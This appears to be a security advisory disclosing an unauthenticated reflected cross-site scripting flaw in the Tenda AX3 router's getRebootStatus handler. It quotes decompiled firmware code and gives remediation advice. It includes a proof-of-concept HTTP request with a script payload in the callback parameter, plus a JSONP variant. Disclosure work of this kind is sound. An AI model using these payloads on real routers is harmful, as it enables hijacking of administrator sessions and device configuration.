# Tenda AX3 V16.03.12.11 was discovered to contain an unauthenticated cross-site scripting vulnerability in getRebootStatus

## Overview

- Vendor: Tenda
- Product: AX3 (V16.03.12.11_cn_TDC01)
- Version: V16.03.12.11
- Component: bin/httpd, /goform/getRebootStatus
- Vulnerability Class: CWE-79 cross-site scripting
- CVSS 3.1 (tentative): 6.1 Medium `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
- Manufacturer: https://www.tendacn.com/

## Affected version

- `US_AX3V2.0br_V16.03.12.11_cn_TDC01.bin`.
- UBI `img-1572024763_vol-rootfs_ubifs.ubifs`.
- `bin/httpd`.

## Vulnerability details

`R7WebsSecurityHandler` explicitly exempts `/goform/getRebootStatus`
from the login check:

```c
|| !strncmp(url, "/goform/getRebootStatus", 0x17u)
```

The handler `fromGetRebootStatus` at `0x543c0` reads the `callback`
form/query value with `websGetVar`, does no HTML/JS escaping, and writes
it back:

```c
Var = websGetVar(wp, "callback", "");
...
snprintf(result, 0x3f, "%s(%s)\n", Var, v7);
...
websWrite(wp, result);
```

`callback` is therefore reflected into a JSONP-style response before
authentication. If a victim is induced to open a crafted
`/goform/getRebootStatus?callback=...` URL and the response is rendered
as HTML/JavaScript by the browser, arbitrary script executes in the
router's origin. The route is normally used by the login/status page, so
a crafted link can run in the context of an authenticated administrator's
browser.

## PoC

```http
GET /goform/getRebootStatus?callback=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: <router>
Cookie: <admin cookie if already logged in>
```

The response body contains:

```text
<script>alert(document.domain)</script>({"status":"success"})
```

A JSONP-compatible payload can also be used:

```text
callback=alert(document.domain)//
```

## Verification

The vulnerable handler in the stock `bin/httpd, /goform/getRebootStatus` was decompiled from the unpacked rootfs; the relevant code and offsets are quoted above. No dynamic run was completed.

## Impact

An unauthenticated attacker can craft a link that executes JavaScript in
the router web origin when opened by an administrator. This can read
same-origin configuration pages, perform authenticated actions, or
exfiltrate session material; impact depends on the browser's handling of
the JSONP response and the victim's session.

## Remediation / known-CVE relation

- Remove `/goform/getRebootStatus` from the pre-auth exemption unless it
  is strictly required.
- Validate `callback` against a strict identifier allow-list
  (`^[A-Za-z_$][A-Za-z0-9_$]*$`) or JSON-encode the response without
  reflecting it.
- Set `Content-Type: application/json` and
  `X-Content-Type-Options: nosniff`.

NVD/OSV keyword queries found no AX3 `getRebootStatus` callback XSS;
CVE-2021-44148 is a GL.iNet XSS and CVE-2025-63834 is a Tenda AC18
stored XSS, both different products/handlers. Candidate 0-day; CVE application in progress.

## Additional Information

```markdown
### Vendor
Tenda

### Product
AX3 (V16.03.12.11_cn_TDC01)

### Version or Commit
V16.03.12.11

### Vulnerability Class
CWE-79 cross-site scripting

### CVE_status
CVE application in progress

### Description
R7WebsSecurityHandler exempts /goform/getRebootStatus from the login check, and the handler reflects callback into the response without sanitization, allowing unauthenticated cross-site scripting.

### Affected_component
bin/httpd, /goform/getRebootStatus

### Attack_vector
Unauthenticated GET/POST /goform/getRebootStatus with a crafted callback parameter.

### Product_version
AX3 (V16.03.12.11_cn_TDC01) V16.03.12.11

### Reference
- https://www.tendacn.com/
- https://github.com/vuln-1/vuln/blob/main/Tenda/AX3_V16.03.12.11/report-1.md
```
